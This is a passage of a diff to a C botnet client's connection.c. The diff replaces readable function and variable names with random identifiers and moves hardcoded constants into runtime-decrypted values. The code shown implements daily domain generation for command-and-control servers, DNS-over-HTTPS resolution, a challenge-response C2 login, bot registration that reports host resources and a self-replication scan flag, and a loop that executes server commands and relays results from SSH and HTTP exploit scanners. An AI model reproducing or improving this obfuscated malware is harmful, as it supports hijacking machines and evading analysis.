         /* fallback: DoH TXT */
         {
-            strarr dns = darkrai(domain);
+            strarr dns = Go3xC6n(domain);
             if (sa_count(&dns) > 0) {
                 size_t i;
                 for (i = 0; i < sa_count(&dns); i++) {
-                    strarr addrs = parse_txt_addresses(sa_get(&dns, i));
+                    strarr addrs = kS6pU7n(sa_get(&dns, i));
                     if (sa_count(&addrs) > 0) {
                         sa_insert(&result, &addrs);
                     } else {
-                        strarr ips = parse_txt_ips(sa_get(&dns, i));
+                        strarr ips = Vc2mZ5Q(sa_get(&dns, i));
                         size_t j;
                         const char *pstr = ds_len(&cfg_port) > 0 ? ds_cstr(&cfg_port) : "443";
                         for (j = 0; j < sa_count(&ips); j++) {
-                            expand_ip_ports(&result, sa_get(&ips, j), pstr);
+                            _TL7fj2H(&result, sa_get(&ips, j), pstr);
                         }
                         sa_free(&ips);
                     }
@@ -1222,13 +1289,13 @@ strarr resolve_one(const char *decoded)
 
     /* last resort: use decoded address directly (relies on A record / getaddrinfo) */
     if (ds_len(&txt_domain) > 0) {
-        debug_log("resolve_one: TXT empty, falling back to direct: %s", ds_cstr(&txt_domain));
-        expand_ip_ports(&result, ds_cstr(&txt_domain),
+        _nS5PJ8Y("Fc7FE8v: TXT empty, falling back to direct: %s", ds_cstr(&txt_domain));
+        _TL7fj2H(&result, ds_cstr(&txt_domain),
                         ds_len(&cfg_port) > 0 ? ds_cstr(&cfg_port) : "443");
     } else if (!is_ip && strchr(decoded, ':') == NULL) {
         /* bare hostname without port — TXT failed, try A record via getaddrinfo */
-        debug_log("resolve_one: bare hostname, falling back to direct: %s", decoded);
-        expand_ip_ports(&result, decoded, "443");
+        _nS5PJ8Y("Fc7FE8v: bare hostname, falling back to direct: %s", decoded);
+        _TL7fj2H(&result, decoded, "443");
     }
 
     ds_free(&txt_domain);
@@ -1237,40 +1304,40 @@ strarr resolve_one(const char *decoded)
 }
 
 /* ======================================================================
-   dialga_one — decrypt config entry at index, resolve to addresses
+   dH7QB8j — decrypt config entry at index, resolve to addresses
    ====================================================================== */
 
-strarr dialga_one(int idx)
+strarr dH7QB8j(int idx)
 {
     strarr result;
     dstr decoded;
 
     sa_init(&result);
 
-    if (idx < 0 || idx >= (int)sa_count(&g_service_addrs)) return result;
+    if (idx < 0 || idx >= (int)sa_count(&_zU4TP2B)) return result;
 
-    decoded = venusaur(sa_get(&g_service_addrs, idx));
+    decoded = _Kd6BF5m(sa_get(&_zU4TP2B, idx));
     if (ds_len(&decoded) == 0) {
         ds_free(&decoded);
         return result;
     }
 
-    debug_log("dialga_one[%d]: decoded = %s", idx, ds_cstr(&decoded));
-    result = resolve_one(ds_cstr(&decoded));
+    _nS5PJ8Y("dH7QB8j[%d]: decoded = %s", idx, ds_cstr(&decoded));
+    result = Fc7FE8v(ds_cstr(&decoded));
     ds_free(&decoded);
     return result;
 }
 
 /* ======================================================================
-   kyurem — DGA domain generation for a given index
+   Bp6se4h — DGA domain generation for a given index
    Generates domain + port from daily rotating seed.
    ====================================================================== */
 
-void kyurem(int index, dstr *domain_out, dstr *port_out)
+void Bp6se4h(int index, dstr *domain_out, dstr *port_out)
 {
     time_t now;
     struct tm *t;
-    sha256_ctx_t ctx;
+    _BW4EK8x ctx;
     uint8_t hash[32];
     char seed_str[128];
     char domain_buf[64];
@@ -1283,16 +1350,17 @@ void kyurem(int index, dstr *domain_out, dstr *port_out)
     now = time(NULL);
     t   = gmtime(&now);
 
-    /* seed = CONFIG_SEED + year + month + day + index */
+    /* seed = config_seed + year + month + day + index */
+    iB2Zq4a();
     snprintf(seed_str, sizeof(seed_str), "%s%04d%02d%02d%d",
-             CONFIG_SEED,
+             ds_cstr(&_gC8se3d),
              t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
              index);
 
     /* hash the seed with sha256 streaming API */
-    sha256_init(&ctx);
-    sha256_update(&ctx, (const uint8_t *)seed_str, strlen(seed_str));
-    sha256_finish(&ctx, hash);
+    _tP5sQ3C(&ctx);
+    _iS7pL8N(&ctx, (const uint8_t *)seed_str, strlen(seed_str));
+    _Vd5Ph6z(&ctx, hash);
 
     /* generate domain label from first 16 bytes of hash */
     for (i = 0; i < 16; i++) {
@@ -1301,7 +1369,7 @@ void kyurem(int index, dstr *domain_out, dstr *port_out)
     domain_buf[16] = '\0';
 
     ds_set(domain_out, domain_buf);
-    ds_cat(domain_out, DGA_TLD);
+    ds_catds(domain_out, &_dT5lg2z);
 
     /* port from bytes 16-17 of hash, mapped to 1024-65535 */
     port_num = 1024 + (((int)hash[16] << 8) | hash[17]) % (65535 - 1024);
@@ -1312,19 +1380,19 @@ void kyurem(int index, dstr *domain_out, dstr *port_out)
         ds_set(port_out, pbuf);
     }
 
-    debug_log("kyurem[%d]: %s:%s", index, ds_cstr(domain_out), ds_cstr(port_out));
+    _nS5PJ8Y("Bp6se4h[%d]: %s:%s", index, ds_cstr(domain_out), ds_cstr(port_out));
 }
 
 /* ======================================================================
-   necrozma — resolve hostname to IP via DoH (rayquaza) then system DNS
+   xu4si4C — resolve hostname to IP via DoH (DR4Wt6N) then system DNS
    ====================================================================== */
 
-dstr necrozma(const char *domain)
+dstr xu4si4C(const char *domain)
 {
     dstr ip;
 
     /* try DoH first */
-    ip = rayquaza(domain);
+    ip = DR4Wt6N(domain);
     if (ds_len(&ip) > 0) return ip;
 
     /* fallback: system getaddrinfo */
@@ -1350,18 +1418,18 @@ dstr necrozma(const char *domain)
 }
 
 /* ======================================================================
-   anonymous_sudan — C2 session handler (auth + command loop)
+   Ht7Lk2Y — C2 session handler (auth + command loop)
 
-   Protocol (over encrypted VPE2 channel):
+   Protocol (over encrypted EZF3 channel):
      Server → "AUTH_CHALLENGE:<challenge>\n"
      Bot    → sha256_b64(challenge + SYNC_TOKEN + challenge) + "\n"
      Server → "AUTH_SUCCESS\n"  or  "AUTH_FAILED\n"
      Bot    → "REGISTER:<version>:<bot_id>:<arch>:<ram>:<cpu>:<proc>\n"
      Server → "PING\n"     Bot → "PONG\n"
-     Server → "<command>\n" Bot → executes via black_energy
+     Server → "<command>\n" Bot → executes via CS6Ko7t
    ====================================================================== */
 
-void anonymous_sudan(conn_t *c)
+void Ht7Lk2Y(_EA8up4M *c)
 {
     dstr line;
     dstr challenge;
@@ -1372,19 +1440,19 @@ void anonymous_sudan(conn_t *c)
     if (!c || !c->valid) return;
 
     /* Initialize protocol strings (lazy decrypt) */
-    ensure_proto();
+    DS4RR2W();
 
     /* Step 1: Read AUTH_CHALLENGE */
-    line = vpn_read_line(c, 15);
+    line = Un4Ss4D(c, 15);
     if (ds_len(&line) == 0) {
-        debug_log("anonymous_sudan: no challenge received");
+        _nS5PJ8Y("Ht7Lk2Y: no challenge received");
         ds_free(&line);
         return;
     }
 
     /* expect "AUTH_CHALLENGE:<challenge>" */
     if (strncmp(ds_cstr(&line), "AUTH_CHALLENGE:", 15) != 0) {
-        debug_log("anonymous_sudan: unexpected: %s", ds_cstr(&line));
+        _nS5PJ8Y("Ht7Lk2Y: unexpected: %s", ds_cstr(&line));
         ds_free(&line);
         return;
     }
@@ -1393,51 +1461,52 @@ void anonymous_sudan(conn_t *c)
     ds_set(&challenge, ds_cstr(&line) + 15);
     ds_free(&line);
 
-    /* Step 2: Compute response = hafnium(challenge, SYNC_TOKEN)
-       = base64(sha256(challenge + SYNC_TOKEN + challenge)) */
-    response = hafnium(ds_cstr(&challenge), SYNC_TOKEN);
+    /* Step 2: Compute response = _Xe8Yw5c(challenge, sync_token)
+       = base64(sha256(challenge + sync_token + challenge)) */
+    response = _Xe8Yw5c(ds_cstr(&challenge), ds_cstr(&_Lv3Qk8T));
     ds_free(&challenge);
 
-    /* send response */
-    vpn_writes(c, ds_cstr(&response));
-    vpn_writes(c, "\n");
+    /* send response — append \n and send as a single frame so the CNC's
+       ReadFrame for the REGISTER message isn't consumed by a bare "\n" frame */
+    ds_catc(&response, '\n');
+    Ng2ZR5y(c, ds_cstr(&response));
     ds_free(&response);
 
     if (!c->valid) return;
 
     /* Step 3: Read AUTH_SUCCESS or AUTH_FAILED */
-    line = vpn_read_line(c, 15);
-    if (ds_len(&line) == 0 || !ds_eq(&line, ds_cstr(&g_proto_success))) {
-        debug_log("anonymous_sudan: auth failed: %s", ds_cstr(&line));
+    line = Un4Ss4D(c, 15);
+    if (ds_len(&line) == 0 || !ds_eq(&line, ds_cstr(&_KB5jb2q))) {
+        _nS5PJ8Y("Ht7Lk2Y: auth failed: %s", ds_cstr(&line));
         ds_free(&line);
         return;
     }
     ds_free(&line);
 
-    debug_log("anonymous_sudan: authenticated");
+    _nS5PJ8Y("Ht7Lk2Y: authenticated");
 
     /* Step 4: Send REGISTER message
        Format: REGISTER:<version>:<bot_id>:<arch>:<ram>:<cpu>:<proc>:<uplink> */
     ds_init(&reg_msg);
 
-    snprintf(ram_str, sizeof(ram_str), "%lld", (long long)g_ram);
-    snprintf(cpu_str, sizeof(cpu_str), "%d", g_cpu);
+    snprintf(ram_str, sizeof(ram_str), "%lld", (long long)_GL4jD4V);
+    snprintf(cpu_str, sizeof(cpu_str), "%d", _Ym3DC2v);
 
     /* Build: REGISTER:<version>:<bot_id>:<arch>:<ram>:<cpu>:<proc> */
     ds_cat(&reg_msg, "REGISTER:");
-    ds_cat(&reg_msg, BUILD_TAG);
+    ds_catds(&reg_msg, &_bT4ag3x);
     ds_cat(&reg_msg, ":");
-    ds_cat(&reg_msg, ds_cstr(&g_bot_id));
+    ds_cat(&reg_msg, ds_cstr(&_yg5RE4m));
     ds_cat(&reg_msg, ":");
-    ds_cat(&reg_msg, ds_cstr(&g_arch));
+    ds_cat(&reg_msg, ds_cstr(&_dG3DF2X));
     ds_cat(&reg_msg, ":");
     ds_cat(&reg_msg, ram_str);
     ds_cat(&reg_msg, ":");
     ds_cat(&reg_msg, cpu_str);
     ds_cat(&reg_msg, ":");
-    ds_cat(&reg_msg, ds_cstr(&g_proc));
+    ds_cat(&reg_msg, ds_cstr(&_ZC6YY5F));
     ds_cat(&reg_msg, ":");
-    ds_cat(&reg_msg, ds_empty(&g_origin) ? "direct" : ds_cstr(&g_origin));
+    ds_cat(&reg_msg, ds_empty(&_my4vH6P) ? "direct" : ds_cstr(&_my4vH6P));
 #ifndef NO_SELFREP
     ds_cat(&reg_msg, ":scan");
 #else
@@ -1450,12 +1519,12 @@ void anonymous_sudan(conn_t *c)
 #endif
     ds_cat(&reg_msg, "\n");
 
-    vpn_writes(c, ds_cstr(&reg_msg));
+    Ng2ZR5y(c, ds_cstr(&reg_msg));
     ds_free(&reg_msg);
 
     if (!c->valid) return;
 
-    debug_log("anonymous_sudan: registered, entering command loop");
+    _nS5PJ8Y("Ht7Lk2Y: registered, entering command loop");
 
     /* Step 5: Command loop — read first byte, dispatch binary or text */
     for (;;) {
@@ -1463,7 +1532,7 @@ void anonymous_sudan(conn_t *c)
 
         /* Poll C2 fd + all scanner report pipes */
         {
-            struct pollfd pfds[6];
+            struct pollfd pfds[8];
             int nfds = 1, ret, c2_ready = 0;
 
             pfds[0].fd = c->fd;
@@ -1471,9 +1540,9 @@ void anonymous_sudan(conn_t *c)
 
 #ifndef NO_SELFREP
             {
-                int *scan_fds[] = { &ssh_report_fd, &http_report_fd };
+                int *scan_fds[] = { &_SV2eW7e, &_NG8vu2i, &_sn3ST8f };
                 int si;
-                for (si = 0; si < 2; si++) {
+                for (si = 0; si < 3; si++) {
                     if (*scan_fds[si] >= 0) {
                         pfds[nfds].fd = *scan_fds[si];
                         pfds[nfds].events = POLLIN;
@@ -1489,17 +1558,18 @@ void anonymous_sudan(conn_t *c)
             /* Drain all active scanner pipes */
             {
                 struct { int *fd; int *pid; } scanners[] = {
-                    { &ssh_report_fd, &ssh_scanner_pid },
-                    { &http_report_fd, &http_exploit_pid },
+                    { &_SV2eW7e, &_bj8XN2t },
+                    { &_NG8vu2i, &_AR2yQ6h },
+                    { &_sn3ST8f, &_sn7PK3z },
                 };
                 int si;
-                for (si = 0; si < 2; si++) {
+                for (si = 0; si < 3; si++) {
                     if (*scanners[si].fd >= 0) {
                         char rpbuf[512];
                         ssize_t rn;
                         while ((rn = read(*scanners[si].fd, rpbuf, sizeof(rpbuf) - 1)) > 0) {
                             rpbuf[rn] = '\0';
-                            vpn_writes(c, rpbuf);
+                            Ng2ZR5y(c, rpbuf);
                         }
                         if (rn == 0) {
                             int dead_pid = *scanners[si].pid;
@@ -1515,7 +1585,7 @@ void anonymous_sudan(conn_t *c)
 
             if (ret < 0 && errno == EINTR) continue;
             if (ret == 0) {
-                debug_log("anonymous_sudan: no data in 180s, disconnecting");
+                _nS5PJ8Y("Ht7Lk2Y: no data in 180s, disconnecting");
                 break;
             }
 
@@ -1523,7 +1593,7 @@ void anonymous_sudan(conn_t *c)
             if (!c2_ready) continue; /* only pipe had data, loop back */
         }
 
-        first = vpn_read_byte(c, 0);
+        first = nb2Fg4N(c, 0);
 
         if (!c->valid || first < 0) {
             break;
@@ -1536,21 +1606,21 @@ void anonymous_sudan(conn_t *c)
             uint16_t args_len;
             char args[4096];
 
-            if (vpn_read_exact(c, &cmd_id, 1, 10) < 0) break;
-            if (vpn_read_exact(c, len_buf, 2, 10) < 0) break;
+            if (AF6jH4z(c, &cmd_id, 1, 10) < 0) break;
+            if (AF6jH4z(c, len_buf, 2, 10) < 0) break;
             args_len = ((uint16_t)len_buf[0] << 8) | len_buf[1];
             if (args_len > sizeof(args) - 1) {
-                debug_log("anonymous_sudan: args too large (%d), dropping", args_len);
+                _nS5PJ8Y("Ht7Lk2Y: args too large (%d), dropping", args_len);
                 break;
             }
             if (args_len > 0) {
-                if (vpn_read_exact(c, args, args_len, 10) < 0) break;
-                /* VPE2: no XOR layer — transport encryption handles all crypto */
+                if (AF6jH4z(c, args, args_len, 10) < 0) break;
+                /* EZF3: no XOR layer — transport encryption handles all crypto */
             }
             args[args_len] = '\0';
 
-            debug_log("anonymous_sudan: bin cmd=0x%02X len=%d args=%s", cmd_id, args_len, args);
-            dispatch_cmd(c, cmd_id, args);
+            _nS5PJ8Y("Ht7Lk2Y: bin cmd=0x%02X len=%d args=%s", cmd_id, args_len, args);
+            yD8Ug8t(c, cmd_id, args);
         } else {
             /* Text line — accumulate rest until \n (PING/PONG or legacy) */
             dstr line;
@@ -1558,7 +1628,7 @@ void anonymous_sudan(conn_t *c)
             ds_catc(&line, (char)first);
 
             for (;;) {
-                int b = vpn_read_byte(c, 180);
+                int b = nb2Fg4N(c, 180);
                 if (b < 0 || b == '\n') break;
                 if (b != '\r') ds_catc(&line, (char)b);
             }
@@ -1566,18 +1636,18 @@ void anonymous_sudan(conn_t *c)
             if (!c->valid) { ds_free(&line); break; }
 
             if (ds_eq(&line, "PING")) {
-                vpn_writes(c, "PONG\n");
-                debug_log("anonymous_sudan: got PING, sent PONG");
+                Ng2ZR5y(c, "PONG\n");
+                _nS5PJ8Y("Ht7Lk2Y: got PING, sent PONG");
             } else if (ds_len(&line) > 0) {
                 /* Legacy text command fallback */
-                debug_log("anonymous_sudan: text cmd = %s", ds_cstr(&line));
-                black_energy(c, ds_cstr(&line));
+                _nS5PJ8Y("Ht7Lk2Y: text cmd = %s", ds_cstr(&line));
+                CS6Ko7t(c, ds_cstr(&line));
             }
             ds_free(&line);
         }
     }
 
-    debug_log("anonymous_sudan: session ended");
+    _nS5PJ8Y("Ht7Lk2Y: session ended");
 }
 
 /* end of connection.c */
